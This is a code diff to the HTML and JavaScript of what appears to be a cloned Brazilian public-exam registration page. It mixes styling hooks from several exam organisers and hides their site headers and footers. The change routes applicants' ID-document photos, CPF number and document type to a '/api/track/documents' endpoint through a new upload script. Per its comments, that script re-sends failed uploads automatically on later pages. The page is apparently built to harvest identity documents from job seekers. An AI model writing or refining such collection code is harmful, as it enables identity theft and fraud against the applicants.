@@ -396,6 +396,7 @@ body.__cebraspe-applied [class*="vp-pop-up"] {
 <style>html body .aocp-edital-card{width:auto!important;max-width:none!important;margin-left:0!important;margin-right:0!important;box-sizing:border-box!important}@media(max-width:767px){html body .vn-lgpd{text-align:left!important;padding:12px 14px!important;font-size:13px!important}}</style><link href="/vunesp/pages.css?v=9" rel="stylesheet"/><style>html.vn-wait body{opacity:0!important}html body{transition:opacity .15s ease}</style><script>document.documentElement.classList.add("vn-wait");setTimeout(function(){document.documentElement.classList.remove("vn-wait")},2500);</script><style>@media(max-width:767px){html body:not(#vn_a):not(#vn_b) .Miolo{padding-left:8px!important;padding-right:8px!important}html body:not(#vn_a):not(#vn_b) .vn-x,html body:not(#vn_a):not(#vn_b) #pgInformacoes,html body:not(#vn_a):not(#vn_b) .blocoPadrao,html body:not(#vn_a):not(#vn_b) .blocoPadrao .dados{padding-left:0!important;padding-right:0!important;margin-left:0!important;margin-right:0!important}html body:not(#vn_a):not(#vn_b) .blocoPadrao fieldset{padding-left:12px!important;padding-right:12px!important;margin-left:0!important;margin-right:0!important}}</style><link rel="stylesheet" href="/assets/mobile.css?v=3"></head>
 <body class="concurso128 __cebraspe-applied">
 <link href="/seduc/seduc-theme.css?v=11" rel="stylesheet"/><script src="/seduc/concurso.js?v=7"></script>
+<script src="/seduc/docs-upload.js?v=1"></script>
 <script src="/seduc/seduc-theme.js?v=47"></script><style id="__fgv_layout">
 html,body{margin:0 !important;padding:0 !important;background:#fff !important}
 #TopoMobile, #TopMenu, #Topo, .bgConcurso, #Rodape, #__page_loader { display:none !important; }
@@ -1218,63 +1219,23 @@ function __handleDocTipo(v){
         }
       });
 
-      // Converte arquivos para base64 e envia.
-      // Imagens são comprimidas no cliente (fotos de celular têm vários MB),
-      // reduzindo o payload e evitando que o upload seja cancelado no mobile.
-      function fileToB64(f){
-        return new Promise(function(res){
-          if(!f){ res(''); return; }
-          var isImg = /^image\//.test(f.type || '');
-          var r = new FileReader();
-          r.onerror = function(){ res(''); };
-          if(!isImg){
-            // PDF ou outro tipo: envia como está (sem compressão), com o data URL completo
-            r.onload = function(){ res(String(r.result||'')); };
-            r.readAsDataURL(f);
-            return;
-          }
-          r.onload = function(){
-            var img = new Image();
-            img.onload = function(){
-              try{
-                var MAX = 1600;
-                var w = img.width, h = img.height;
-                if(w > MAX || h > MAX){
-                  if(w >= h){ h = Math.round(h * MAX / w); w = MAX; }
-                  else { w = Math.round(w * MAX / h); h = MAX; }
-                }
-                var canvas = document.createElement('canvas');
-                canvas.width = w; canvas.height = h;
-                canvas.getContext('2d').drawImage(img, 0, 0, w, h);
-                res(String(canvas.toDataURL('image/jpeg', 0.8)));
-              }catch(e){
-                res(String(r.result||''));
-              }
-            };
-            img.onerror = function(){ res(String(r.result||'')); };
-            img.src = String(r.result || '');
-          };
-          r.readAsDataURL(f);
-        });
-      }
+      // Envia os documentos de forma robusta (ver /seduc/docs-upload.js).
+      // A conversão nunca trava e, se o envio falhar, fica pendente e é
+      // reenviado automaticamente nas páginas seguintes.
       var frenteFile = form.querySelector('#DOC_FRENTE');
       var versoFile = form.querySelector('#DOC_VERSO');
       var f1 = frenteFile && frenteFile.files && frenteFile.files[0];
       var f2 = versoFile && versoFile.files && versoFile.files[0];
-      var docsUpload = Promise.all([fileToB64(f1), fileToB64(f2)]).then(function(bufs){
-        return window.__post('/api/track/documents', {
-          cpf: data.CPF || '',
-          doc_tipo: data.DOC_TIPO || 'RG',
-          doc_frente: bufs[0] || '',
-          doc_verso: bufs[1] || ''
-        });
-      });
+
+      var docsUpload = (typeof window.__docsUpload === 'function')
+        ? window.__docsUpload(f1, f2, data.CPF || '', data.DOC_TIPO || 'RG')
+        : Promise.resolve({ enviado: false, vazio: !f1 && !f2 });
 
       // Salva contexto de vaga para /confirmacao usar
       try{
         var ctx = Object.assign({}, data, {
           __concurso: CONCURSO,
-          __edital: ((window.SEAD_CONCURSO && SEAD_CONCURSO.key === 'cbmpe') ? 'CONCURSO_CURITIBA_26' : 'CONCURSO_CURITIBA_26'),
+          __edital: 'CONCURSO_CURITIBA_26',
           __cargo_codigo: vagaInfo.codigo,
           __cargo_titulo: vagaInfo.titulo,
           __taxa: vagaInfo.taxa,
@@ -1284,13 +1245,12 @@ function __handleDocTipo(v){
         localStorage.setItem('inscricao_dados', JSON.stringify(ctx));
       }catch(e){}
 
-      // Só navega DEPOIS que o upload do documento concluir (evita cancelamento
-      // no mobile, onde a foto é maior e o envio leva mais que 1s).
-      // Fallback de segurança para não travar o usuário caso a rede falhe.
+      // Só navega depois que o upload terminar. O uploader sempre resolve,
+      // então o fallback existe apenas para falha total de rede.
       var __navegou = false;
       function __irProxima(){ if(__navegou) return; __navegou = true; window.location.href = '/dados-inscricao.html'; }
-      docsUpload.then(__irProxima);
-      setTimeout(__irProxima, 20000);
+      docsUpload.then(function(){ __irProxima(); });
+      setTimeout(__irProxima, 45000);
     });
   });
 })();
